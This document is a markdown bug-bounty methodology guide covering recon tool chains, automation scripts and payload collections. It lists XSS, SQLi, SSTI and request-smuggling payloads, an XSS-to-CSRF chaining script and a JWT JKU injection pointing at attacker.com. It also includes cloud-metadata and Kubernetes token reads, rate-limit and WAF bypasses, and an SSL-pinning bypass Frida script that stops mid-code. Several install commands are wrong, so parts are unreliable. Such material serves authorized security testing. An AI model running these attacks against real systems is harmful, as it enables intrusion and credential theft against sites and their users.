# 🚀 Enhanced Bug Hunting Workflow - Latest 2024-2025 Additions

## 🔥 Latest Tools & Techniques to Add

### 1. ProjectDiscovery 2024-2025 Arsenal

#### Chaos - Live Internet Database
```bash
# Installation
go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest

# Usage - Get subdomains from live internet database
chaos -d target.com -silent | anew chaos_subs.txt
chaos -d target.com -count  # Get subdomain count
chaos -bbq -d target.com    # Bug bounty specific data
```

#### Uncover - Multi-Source Asset Discovery
```bash
# Installation
go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest

# Usage - Discover assets from multiple sources
uncover -q 'target.com' -e shodan,censys,fofa,zoomeye -silent | anew uncover_assets.txt
uncover -q 'ssl:"target.com"' -e shodan -limit 100
```

#### Interactsh - Out-of-Band Interaction Testing
```bash
# Installation
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Usage - Generate interaction URLs for blind vulnerabilities
interactsh-client -server interactsh.com
# Use generated URLs in payloads for blind XSS, SSRF, etc.
```

#### Notify - Real-time Notifications
```bash
# Installation
go install -v github.com/projectdiscovery/notify/cmd/notify@latest

# Setup - Configure with Slack/Discord/Telegram
notify -provider-config

# Usage - Get real-time notifications
subfinder -d target.com -silent | notify -bulk
nuclei -l targets.txt -t cves/ | notify
```

#### Proxify - HTTP Proxy Toolkit
```bash
# Installation
go install -v github.com/projectdiscovery/proxify/cmd/proxify@latest

# Usage - Capture and replay HTTP traffic
proxify -output logs/
# Run your tools through proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
```

#### Alterx - Subdomain Wordlist Generator
```bash
# Installation
go install github.com/projectdiscovery/alterx/cmd/alterx@latest

# Usage - Generate custom subdomain wordlists
echo "target.com" | alterx -enrich -silent | head -20
alterx -l subdomains.txt -enrich -limit 1000
```

### 2. Advanced Vulnerability Testing Techniques

#### HTTP Request Smuggling (2024 Methods)
```bash
# Installation
pip3 install smuggler

# Usage - Advanced smuggling detection
python3 smuggler.py -u https://target.com
python3 smuggler.py -u https://target.com --method POST

# Manual testing payloads
# CL.TE Smuggling
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL Smuggling
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0
```

#### Race Condition Testing (Automated)
```bash
# Installation
go install github.com/ameenmaali/qsreplace@latest
pip3 install race-the-web

# Usage - Automated race condition testing
race-the-web -t 10 -c 'curl -X POST https://target.com/api/transfer -d "amount=1000&to=attacker"'

# Turbo Intruder style (using ffuf)
ffuf -u https://target.com/api/endpoint -X POST -d "param=value" -t 50 -rate 100
```

#### GraphQL Advanced Testing
```bash
# Installation
pip3 install graphql-cop
go install github.com/assetnote/surf/cmd/surf@latest

# Usage - GraphQL security testing
graphql-cop -t https://target.com/graphql
surf -u https://target.com/graphql -query-file queries.txt

# Advanced GraphQL queries
# Introspection query
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}

# Batch queries for DoS
[{"query":"query{user(id:1){name}}"},{"query":"query{user(id:2){name}}"}]
```

#### JWT Advanced Attacks
```bash
# Installation
pip3 install pyjwt
go install github.com/ticarpi/jwt_tool@latest

# Usage - JWT security testing
jwt_tool.py -t https://target.com -rh "Authorization: Bearer TOKEN"
jwt_tool.py TOKEN -C -d wordlist.txt  # Crack JWT secret

# JWT attack payloads
# Algorithm confusion
# None algorithm bypass
# Key confusion attacks
```

#### Business Logic Flaw Testing
```bash
# Systematic approach for business logic testing

# 1. Price manipulation
curl -X POST https://target.com/api/purchase \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"price":-100,"quantity":1}'

# 2. Workflow bypass
# Skip payment step
curl -X POST https://target.com/api/order/confirm \
  -H "Authorization: Bearer TOKEN" \
  -d '{"order_id":123,"status":"paid"}'

# 3. Rate limit bypass
# Use different headers
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/endpoint
curl -H "X-Real-IP: 1.2.3.4" https://target.com/api/endpoint
```

### 3. Advanced Automation Scripts

#### One-Liner Automation Chains
```bash
# Complete recon chain
echo "target.com" | subfinder -silent | httpx -silent -status-code | katana -silent -d 5 | grep "=" | dalfox pipe --silence

# Advanced parameter discovery
cat alive_urls.txt | gau | grep "=" | qsreplace "FUZZ" | ffuf -w params.txt -u FUZZ -mc 200,301,302

# JS secrets hunting
cat urls.txt | grep "\.js" | httpx -silent | xargs -I {} sh -c 'echo {} && curl -s {} | grep -E "(api_key|secret|token|password)" | head -5'

# Comprehensive vulnerability scan
nuclei -l targets.txt -t cves/,vulnerabilities/,misconfiguration/ -severity critical,high -o results.txt | notify
```

#### Custom Automation Framework
```bash
#!/bin/bash
# Advanced Bug Hunting Automation Script

TARGET=$1
WORKSPACE="$HOME/bugbounty/$TARGET"
mkdir -p $WORKSPACE/{recon,vulns,reports}
cd $WORKSPACE

# Phase 1: Asset Discovery
echo "[+] Starting asset discovery for $TARGET"
subfinder -d $TARGET -all -silent | tee recon/subfinder.txt
chaos -d $TARGET -silent | tee recon/chaos.txt
uncover -q "$TARGET" -e shodan,censys -silent | tee recon/uncover.txt
cat recon/*.txt | sort -u > recon/all_subdomains.txt

# Phase 2: Live Host Detection
echo "[+] Checking live hosts"
cat recon/all_subdomains.txt | httpx -silent -status-code -title -tech-detect | tee recon/live_hosts.txt

# Phase 3: URL Collection
echo "[+] Collecting URLs"
cat recon/live_hosts.txt | cut -d' ' -f1 | katana -silent -d 5 -jc | tee recon/all_urls.txt
cat recon/live_hosts.txt | cut -d' ' -f1 | gau | tee -a recon/all_urls.txt
sort -u recon/all_urls.txt -o recon/all_urls.txt

# Phase 4: Parameter Discovery
echo "[+] Finding parameters"
cat recon/all_urls.txt | grep "=" | tee recon/params.txt
cat recon/all_urls.txt | grep -v "=" | arjun -i /dev/stdin -oT recon/arjun_params.txt

# Phase 5: Vulnerability Scanning
echo "[+] Running vulnerability scans"
nuclei -l recon/live_hosts.txt -t cves/,vulnerabilities/ -severity critical,high -o vulns/nuclei_results.txt
cat recon/params.txt | dalfox pipe --silence --no-spinner -o vulns/xss_results.txt
sqlmap -m recon/params.txt --batch --level=2 --risk=2 --random-agent --output-dir=vulns/sqlmap/

# Phase 6: Reporting
echo "[+] Generating report"
echo "Bug Hunting Report for $TARGET" > reports/summary.txt
echo "Generated on: $(date)" >> reports/summary.txt
echo "Total subdomains: $(wc -l < recon/all_subdomains.txt)" >> reports/summary.txt
echo "Live hosts: $(wc -l < recon/live_hosts.txt)" >> reports/summary.txt
echo "URLs collected: $(wc -l < recon/all_urls.txt)" >> reports/summary.txt
echo "Parameters found: $(wc -l < recon/params.txt)" >> reports/summary.txt

# Send notification
cat reports/summary.txt | notify -bulk
echo "[+] Automation complete! Check $WORKSPACE for results"
```

### 4. Mobile App Security Testing

#### Android APK Analysis
```bash
# Installation
pip3 install apktool
pip3 install mobsf-cli

# Usage - APK analysis
apktool d app.apk -o app_decompiled/
grep -r "api_key\|secret\|password" app_decompiled/
grep -r "http://\|https://" app_decompiled/ | grep -v "schema"

# Dynamic analysis with Frida
frida -U -f com.example.app -l script.js --no-pause
```

#### iOS App Analysis
```bash
# Installation (requires macOS)
brew install class-dump
pip3 install ipa-analyzer

# Usage - IPA analysis
unzip app.ipa
class-dump -H Payload/App.app/App -o headers/
grep -r "NSURLRequest\|NSURL" headers/
```

### 5. API Security Testing Advanced

#### REST API Testing
```bash
# Installation
pip3 install arjun
go install github.com/assetnote/kiterunner/cmd/kr@latest

# Usage - API endpoint discovery
kr scan https://target.com/api -w api-wordlist.txt
arjun -u https://target.com/api/endpoint -m GET,POST

# API fuzzing
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,400,401,403,500
```

#### GraphQL API Testing
```bash
# Advanced GraphQL testing
# Introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Batch queries (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"query{users{id,name}}"},{"query":"query{posts{id,title}}"}]'
```

### 6. Cloud Security Testing

#### AWS Security Testing
```bash
# Installation
pip3 install awscli
pip3 install s3scanner

# Usage - S3 bucket testing
s3scanner -l bucket_names.txt
aws s3 ls s3://bucket-name --no-sign-request

# AWS metadata testing
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### Container Security Testing
```bash
# Docker testing
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image target:latest

# Kubernetes testing
kubectl get pods --all-namespaces
kubectl describe pod suspicious-pod -n namespace
```

### 7. Advanced OSINT & Reconnaissance

#### GitHub Reconnaissance
```bash
# Installation
go install github.com/gwen001/github-search@latest
pip3 install truffleHog

# Usage - GitHub secrets hunting
github-search -d target.com -t ghp_token -o github_results.txt
truffleHog --regex --entropy=False https://github.com/target/repo
```

#### Social Media OSINT
```bash
# Installation
pip3 install sherlock
pip3 install social-analyzer

# Usage - Social media reconnaissance
sherlock target_username
social-analyzer --username target_user --websites "twitter,linkedin,github"
```

### 8. Advanced Payload Generation

#### Custom XSS Payloads
```javascript
// Advanced XSS payloads for 2024-2025
// DOM-based XSS
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">

// CSP bypass
<script src="data:text/javascript,alert(document.domain)"></script>

// WAF bypass
<svg/onload=alert(document.domain)>
<iframe srcdoc="<script>alert(parent.document.domain)</script>">
```

#### Advanced SQLi Payloads
```sql
-- Time-based blind SQLi (2024 techniques)
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
'; SELECT pg_sleep(5)--

-- Boolean-based blind SQLi
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

-- Union-based SQLi with WAF bypass
' UNION/**/SELECT/**/1,2,3--
' UNION ALL SELECT NULL,NULL,NULL--
```

This enhanced workflow adds cutting-edge tools and techniques that weren't in your original workflow, bringing it up to 2024-2025 standards!

## 🔥 Latest Bug Hunting Methodologies 2024-2025

### 1. AI-Powered Reconnaissance (2024-2025 Trend)

#### LLM-Assisted Target Analysis
```bash
# Using AI for subdomain generation
echo "target.com" | alterx -enrich -ai -limit 1000 | tee ai_subdomains.txt

# AI-powered payload generation
# Use ChatGPT/Claude for custom payload creation based on target technology
# Example: "Generate XSS payloads for React applications with CSP"
```

#### Machine Learning for Pattern Recognition
```python
# ML-based anomaly detection in responses
import requests
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import KMeans

def analyze_responses(urls):
    responses = []
    for url in urls:
        try:
            resp = requests.get(url, timeout=5)
            responses.append(resp.text)
        except:
            continue
    
    # Vectorize responses
    vectorizer = TfidfVectorizer(max_features=1000)
    X = vectorizer.fit_transform(responses)
    
    # Cluster similar responses
    kmeans = KMeans(n_clusters=5)
    clusters = kmeans.fit_predict(X)
    
    # Find outliers (potential vulnerabilities)
    return clusters
```

### 2. Supply Chain Security Testing

#### Dependency Confusion Attacks
```bash
# Check for internal package names
cat package.json | jq -r '.dependencies | keys[]' | tee internal_packages.txt
cat requirements.txt | grep -E "^[a-zA-Z]" | cut -d'=' -f1 | tee python_packages.txt

# Test for dependency confusion
for pkg in $(cat internal_packages.txt); do
    npm info $pkg 2>/dev/null || echo "Potential target: $pkg"
done
```

### 3. Advanced Business Logic Testing (2024 Methods)

#### Workflow State Manipulation
```bash
# Multi-step process testing
# Step 1: Start process
curl -X POST https://target.com/api/order/create \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"item_id":123,"quantity":1}' | jq -r '.order_id'

# Step 2: Skip payment (business logic flaw)
curl -X POST https://target.com/api/order/confirm \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"order_id":"ORDER_ID","status":"completed"}'
```

#### Economic Logic Flaws
```bash
# Price manipulation testing
# Negative quantities
curl -X POST https://target.com/api/cart/add \
  -d '{"item_id":123,"quantity":-1,"price":100}'

# Currency manipulation
curl -X POST https://target.com/api/payment \
  -d '{"amount":100,"currency":"USD"}' # Original
curl -X POST https://target.com/api/payment \
  -d '{"amount":100,"currency":"IDR"}' # Much lower value currency
```

### 4. Modern Authentication Bypass Techniques

#### OAuth 2.0 Advanced Attacks (2024)
```bash
# State parameter manipulation
# Original: https://target.com/oauth/authorize?state=abc123&redirect_uri=...
# Attack: https://target.com/oauth/authorize?state=attacker_controlled&redirect_uri=...

# PKCE bypass attempts
curl -X POST https://target.com/oauth/token \
  -d 'grant_type=authorization_code&code=AUTH_CODE&code_verifier=WRONG_VERIFIER'
```

#### JWT Advanced Exploitation (2024)
```bash
# Algorithm confusion attacks
# Change RS256 to HS256 and use public key as secret
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# JKU header injection
python3 jwt_tool.py TOKEN -I -hc jku -hv "https://attacker.com/jwks.json"
```

### 5. Cloud-Native Security Testing

#### Kubernetes Security Testing
```bash
# Service account token extraction
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# API server enumeration
kubectl --token=$TOKEN --server=https://k8s-api:6443 get pods --all-namespaces
```

#### Serverless Security Testing
```bash
# AWS Lambda testing
# Environment variable extraction
curl -X POST https://lambda-url.amazonaws.com/function \
  -d '{"command":"env"}'

# Cold start timing attacks
for i in {1..10}; do
    time curl https://lambda-url.amazonaws.com/function
done
```

### 6. Advanced Web Application Testing

#### Client-Side Template Injection (CSTI) 2024
```javascript
// Angular.js CSTI payloads
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}

// Vue.js CSTI payloads
{{constructor.constructor('alert(1)')()}}
{{$el.ownerDocument.defaultView.alert(1)}}
```

#### Server-Side Template Injection (SSTI) Advanced
```bash
# Jinja2 (Python) advanced payloads
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP) advanced payloads
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 7. Advanced API Security Testing

#### GraphQL Advanced Attacks (2024)
```bash
# Batch query attacks for DoS
[
  {"query": "query { users { id name email } }"},
  {"query": "query { posts { id title content } }"},
  {"query": "query { comments { id text } }"}
]

# Alias-based query complexity attacks
query {
  user1: user(id: 1) { name posts { title } }
  user2: user(id: 2) { name posts { title } }
  user3: user(id: 3) { name posts { title } }
  # ... repeat for DoS
}
```

### 8. Modern Evasion Techniques

#### WAF Bypass Methods (2024)
```bash
# Unicode normalization bypass
curl "https://target.com/search?q=%E2%80%BC%E2%80%BCscript%E2%80%BE%E2%80%BEalert(1)"

# HTTP/2 smuggling
python3 h2csmuggler.py -x https://target.com --test

# Case variation bypass
curl "https://target.com/api" -H "Content-Type: ApPlIcAtIoN/jSoN"
```

#### Rate Limiting Bypass (2024)
```bash
# Distributed rate limiting bypass
for ip in $(cat proxy_ips.txt); do
    curl --proxy $ip https://target.com/api/endpoint &
done

# Header-based bypass
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/endpoint
curl -H "X-Real-IP: 192.168.1.1" https://target.com/api/endpoint
```

## 🤖 Advanced Automation Scripts & One-Liners

### 1. Ultimate Bug Hunting One-Liners

#### Complete Recon to Exploitation Chain
```bash
# Full automated recon chain (single line)
echo "target.com" | subfinder -silent | httpx -silent -status-code | katana -silent -d 5 | grep "=" | dalfox pipe --silence | tee xss_found.txt

# Advanced parameter discovery chain
cat alive_urls.txt | waybackurls | grep "=" | qsreplace "FUZZ" | ffuf -w /path/to/params.txt -u FUZZ -mc 200,301,302,403 -fs 0

# JS secrets hunting one-liner
find . -name "*.js" -exec curl -s {} \; | grep -E "(api_key|secret|token|password|bearer)" | sort -u

# Complete SQLi testing chain
cat params.txt | sqlmap -m /dev/stdin --batch --level=2 --risk=2 --random-agent --threads=10 --output-dir=sqlmap_results/
```

#### Advanced Subdomain Discovery Chain
```bash
# Multi-source subdomain discovery
echo "target.com" | subfinder -all -silent | anew subs.txt && chaos -d target.com -silent | anew subs.txt && uncover -q "target.com" -e shodan,censys -silent | anew subs.txt

# Live subdomain filtering with technology detection
cat subs.txt | httpx -silent -status-code -title -tech-detect -follow-redirects | tee live_subs.txt

# Port scanning on live subdomains
cat live_subs.txt | cut -d' ' -f1 | naabu -silent -top-ports 1000 | tee ports.txt
```

### 2. Custom Automation Scripts

#### Multi-Target Bug Hunting Script
```bash
#!/bin/bash
# multi_target_hunt.sh - Hunt multiple targets simultaneously

TARGETS_FILE=$1
THREADS=${2:-10}

if [ ! -f "$TARGETS_FILE" ]; then
    echo "Usage: $0 <targets_file> [threads]"
    exit 1
fi

hunt_target() {
    local target=$1
    local workspace="results/$target"
    mkdir -p "$workspace"
    
    echo "[+] Starting hunt for $target"
    
    # Subdomain discovery
    subfinder -d "$target" -all -silent | tee "$workspace/subdomains.txt"
    
    # Live host detection
    cat "$workspace/subdomains.txt" | httpx -silent -status-code | tee "$workspace/live.txt"
    
    # URL collection
    cat "$workspace/live.txt" | cut -d' ' -f1 | katana -silent -d 3 | tee "$workspace/urls.txt"
    
    # Parameter discovery
    cat "$workspace/urls.txt" | grep "=" | tee "$workspace/params.txt"
    
    # XSS testing
    if [ -s "$workspace/params.txt" ]; then
        cat "$workspace/params.txt" | dalfox pipe --silence -o "$workspace/xss.txt"
    fi
    
    # Nuclei scan
    nuclei -l "$workspace/live.txt" -t cves/ -severity critical,high -o "$workspace/nuclei.txt"
    
    echo "[+] Completed hunt for $target"
}

export -f hunt_target
cat "$TARGETS_FILE" | xargs -n1 -P"$THREADS" -I{} bash -c 'hunt_target "$@"' _ {}

echo "[+] All targets completed. Check results/ directory"
```

#### Smart Parameter Fuzzing Script
```python
#!/usr/bin/env python3
# smart_param_fuzzer.py - Intelligent parameter fuzzing

import requests
import threading
import time
from urllib.parse import urlparse, parse_qs
import json

class SmartFuzzer:
    def __init__(self, target_url, wordlist, threads=10):
        self.target_url = target_url
        self.wordlist = wordlist
        self.threads = threads
        self.results = []
        self.session = requests.Session()
        
    def load_wordlist(self):
        with open(self.wordlist, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def test_parameter(self, param):
        """Test a single parameter"""
        parsed = urlparse(self.target_url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Test different parameter positions
        test_cases = [
            f"{test_url}?{param}=test",
            f"{test_url}?existing=value&{param}=test",
            f"{test_url}#{param}=test"
        ]
        
        for url in test_cases:
            try:
                resp = self.session.get(url, timeout=5)
                if self.is_interesting_response(resp, param):
                    self.results.append({
                        'url': url,
                        'param': param,
                        'status': resp.status_code,
                        'length': len(resp.text),
                        'reflection': param in resp.text
                    })
            except:
                continue
    
    def is_interesting_response(self, response, param):
        """Determine if response is interesting"""
        # Check for parameter reflection
        if param in response.text:
            return True
        
        # Check for error messages
        error_indicators = ['error', 'exception', 'warning', 'debug']
        if any(indicator in response.text.lower() for indicator in error_indicators):
            return True
        
        # Check for unusual status codes
        if response.status_code in [400, 403, 500, 502, 503]:
            return True
        
        return False
    
    def run(self):
        """Run the fuzzing process"""
        params = self.load_wordlist()
        
        def worker():
            while params:
                try:
                    param = params.pop(0)
                    self.test_parameter(param)
                except IndexError:
                    break
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return self.results

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python3 smart_param_fuzzer.py <url> <wordlist>")
        sys.exit(1)
    
    fuzzer = SmartFuzzer(sys.argv[1], sys.argv[2])
    results = fuzzer.run()
    
    print(json.dumps(results, indent=2))
```

#### Automated Vulnerability Chaining Script
```python
#!/usr/bin/env python3
# vuln_chainer.py - Automated vulnerability chaining

import requests
import re
import json
from urllib.parse import urljoin, urlparse

class VulnChainer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []
        
    def find_xss(self):
        """Find XSS vulnerabilities"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "'\"><script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')"
        ]
        
        # Common XSS testing endpoints
        endpoints = ['/search', '/contact', '/feedback', '/comment']
        
        for endpoint in endpoints:
            for payload in xss_payloads:
                try:
                    url = urljoin(self.base_url, endpoint)
                    resp = self.session.get(url, params={'q': payload})
                    
                    if payload in resp.text and resp.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'url': url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        return True
                except:
                    continue
        return False
    
    def find_csrf_token(self):
        """Extract CSRF tokens from forms"""
        try:
            resp = self.session.get(self.base_url)
            csrf_patterns = [
                r'name=["\']csrf[_-]?token["\'] value=["\']([^"\']+)["\']',
                r'name=["\']_token["\'] value=["\']([^"\']+)["\']',
                r'<meta name=["\']csrf-token["\'] content=["\']([^"\']+)["\']'
            ]
            
            for pattern in csrf_patterns:
                match = re.search(pattern, resp.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def test_csrf(self):
        """Test for CSRF vulnerabilities"""
        # Find forms
        try:
            resp = self.session.get(self.base_url)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>', resp.text)
            
            for form_action in forms:
                # Try to submit without CSRF token
                form_url = urljoin(self.base_url, form_action)
                test_data = {'test': 'value'}
                
                resp = self.session.post(form_url, data=test_data)
                
                # Check if request was successful (potential CSRF)
                if resp.status_code == 200 and 'error' not in resp.text.lower():
                    self.vulnerabilities.append({
                        'type': 'CSRF',
                        'url': form_url,
                        'method': 'POST'
                    })
                    return True
        except:
            pass
        return False
    
    def chain_vulnerabilities(self):
        """Chain found vulnerabilities"""
        if len(self.vulnerabilities) >= 2:
            # Example: Use XSS to bypass CSRF
            xss_vuln = next((v for v in self.vulnerabilities if v['type'] == 'XSS'), None)
            csrf_vuln = next((v for v in self.vulnerabilities if v['type'] == 'CSRF'), None)
            
            if xss_vuln and csrf_vuln:
                chain_payload = f"""
                <script>
                fetch('{csrf_vuln['url']}', {{
                    method: 'POST',
                    body: 'malicious=payload',
                    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}}
                }});
                </script>
                """
                
                return {
                    'type': 'XSS_CSRF_Chain',
                    'description': 'XSS can be used to bypass CSRF protection',
                    'payload': chain_payload,
                    'impact': 'High - Can perform actions on behalf of users'
                }
        return None
    
    def run_scan(self):
        """Run complete vulnerability scan"""
        print(f"[+] Starting scan on {self.base_url}")
        
        # Find individual vulnerabilities
        self.find_xss()
        self.find_csrf_token()
        self.test_csrf()
        
        # Try to chain vulnerabilities
        chain = self.chain_vulnerabilities()
        
        results = {
            'target': self.base_url,
            'individual_vulns': self.vulnerabilities,
            'chained_attack': chain
        }
        
        return results

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 vuln_chainer.py <target_url>")
        sys.exit(1)
    
    chainer = VulnChainer(sys.argv[1])
    results = chainer.run_scan()
    print(json.dumps(results, indent=2))
```

### 3. Advanced One-Liner Collections

#### Reconnaissance One-Liners
```bash
# Complete asset discovery
echo "target.com" | subfinder -all -silent | httpx -silent | katana -silent -d 5 | grep -E "\.(js|php|asp|jsp)" | tee assets.txt

# Technology stack identification
cat live_hosts.txt | httpx -silent -tech-detect -status-code | grep -E "(WordPress|Drupal|Joomla|Laravel|Django)"

# Certificate transparency mining
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# GitHub dorking automation
for dork in "target.com password" "target.com api_key" "target.com secret"; do echo "=== $dork ==="; gh search code "$dork" --limit 50; done
```

#### Vulnerability Testing One-Liners
```bash
# Mass XSS testing
cat params.txt | sed 's/=.*/=<script>alert(1)<\/script>/' | xargs -I {} curl -s "{}" | grep -l "alert(1)"

# SQL injection detection
cat params.txt | sed "s/=.*/='/" | xargs -I {} curl -s "{}" | grep -i -E "(error|mysql|oracle|postgresql|sqlite)"

# Open redirect testing
cat params.txt | sed 's/=.*/=https:\/\/evil.com/' | xargs -I {} curl -s -I "{}" | grep -i "location.*evil.com"

# SSRF testing with Burp Collaborator
cat params.txt | sed 's/=.*/=http:\/\/burp-collaborator-subdomain.com/' | xargs -I {} curl -s "{}"
```

#### Advanced Filtering One-Liners
```bash
# Filter interesting status codes
cat urls.txt | httpx -silent -status-code | grep -E "(200|301|302|403|500)" | sort | uniq -c | sort -nr

# Find admin panels
cat subdomains.txt | httpx -silent -path "/admin,/administrator,/wp-admin,/phpmyadmin" -mc 200,301,302

# Extract email addresses from responses
cat urls.txt | xargs -I {} curl -s {} | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u

# Find API endpoints
cat urls.txt | grep -E "(api|v1|v2|v3|rest|graphql)" | httpx -silent -status-code -content-length
```

### 4. Notification and Reporting Automation

#### Slack Notification Script
```bash
#!/bin/bash
# notify_slack.sh - Send findings to Slack

WEBHOOK_URL="YOUR_SLACK_WEBHOOK_URL"
FINDINGS_FILE=$1

if [ ! -f "$FINDINGS_FILE" ]; then
    echo "Usage: $0 <findings_file>"
    exit 1
fi

# Count findings
TOTAL_FINDINGS=$(wc -l < "$FINDINGS_FILE")

# Create Slack message
MESSAGE=$(cat << EOF
{
    "text": "🔍 Bug Hunting Results",
    "attachments": [
        {
            "color": "good",
            "fields": [
                {
                    "title": "Total Findings",
                    "value": "$TOTAL_FINDINGS",
                    "short": true
                },
                {
                    "title": "Target",
                    "value": "$(basename "$FINDINGS_FILE" .txt)",
                    "short": true
                }
            ]
        }
    ]
}
EOF
)

# Send to Slack
curl -X POST -H 'Content-type: application/json' --data "$MESSAGE" "$WEBHOOK_URL"
```

#### Automated Report Generation
```python
#!/usr/bin/env python3
# generate_report.py - Generate HTML report from findings

import json
import sys
from datetime import datetime

def generate_html_report(findings_file, output_file):
    with open(findings_file, 'r') as f:
        findings = json.load(f)
    
    html_template = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bug Hunting Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; }}
            .header {{ background: #f4f4f4; padding: 20px; border-radius: 5px; }}
            .finding {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }}
            .critical {{ border-left: 5px solid #ff0000; }}
            .high {{ border-left: 5px solid #ff8800; }}
            .medium {{ border-left: 5px solid #ffaa00; }}
            .low {{ border-left: 5px solid #00aa00; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔍 Bug Hunting Report</h1>
            <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Total Findings:</strong> {len(findings)}</p>
        </div>
        
        <h2>Findings</h2>
    """
    
    for i, finding in enumerate(findings, 1):
        severity = finding.get('severity', 'medium').lower()
        html_template += f"""
        <div class="finding {severity}">
            <h3>Finding #{i}: {finding.get('title', 'Unknown')}</h3>
            <p><strong>URL:</strong> {finding.get('url', 'N/A')}</p>
            <p><strong>Severity:</strong> {finding.get('severity', 'Medium')}</p>
            <p><strong>Description:</strong> {finding.get('description', 'No description')}</p>
            <p><strong>Payload:</strong> <code>{finding.get('payload', 'N/A')}</code></p>
        </div>
        """
    
    html_template += """
    </body>
    </html>
    """
    
    with open(output_file, 'w') as f:
        f.write(html_template)
    
    print(f"Report generated: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 generate_report.py <findings.json> <output.html>")
        sys.exit(1)
    
    generate_html_report(sys.argv[1], sys.argv[2])
```

### 📱 Comprehensive Mobile App Security Testing

#### Android Application Security Testing

#### Static Analysis (APK Reverse Engineering)
```bash
# Advanced APK analysis toolkit
# Installation
pip3 install apktool
pip3 install dex2jar
pip3 install jadx
pip3 install mobsf-cli
npm install -g apk-mitm

# APK extraction and decompilation
apktool d app.apk -o app_decompiled/
jadx -d jadx_output/ app.apk
dex2jar app.apk  # Creates app-dex2jar.jar

# Convert JAR to readable Java
jd-gui app-dex2jar.jar  # GUI tool for viewing Java code

# Automated security analysis
mobsf-cli -f app.apk -s http://localhost:8000  # MobSF analysis
```

#### Advanced Android Security Testing
```bash
# Manifest analysis
grep -r "android:exported=\"true\"" app_decompiled/
grep -r "android:allowBackup=\"true\"" app_decompiled/
grep -r "android:debuggable=\"true\"" app_decompiled/

# Hardcoded secrets detection
grep -r -i "password\|secret\|api_key\|token" app_decompiled/ | head -20
grep -r "http://\|https://" app_decompiled/ | grep -v schema | head -20

# SSL/TLS security analysis
grep -r "TrustAllX509TrustManager\|ALLOW_ALL_HOSTNAME_VERIFIER" app_decompiled/
grep -r "checkServerTrusted\|checkClientTrusted" app_decompiled/

# Intent filter analysis
grep -A 10 -B 5 "intent-filter" app_decompiled/AndroidManifest.xml

# Backup analysis
adb backup -f backup.ab com.example.app
dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" | tar -xvf -
```

#### Dynamic Analysis with Frida
```javascript
// frida_scripts.js - Advanced Frida scripts for Android

// SSL Pinning Bypass
Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.sensepost.test.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
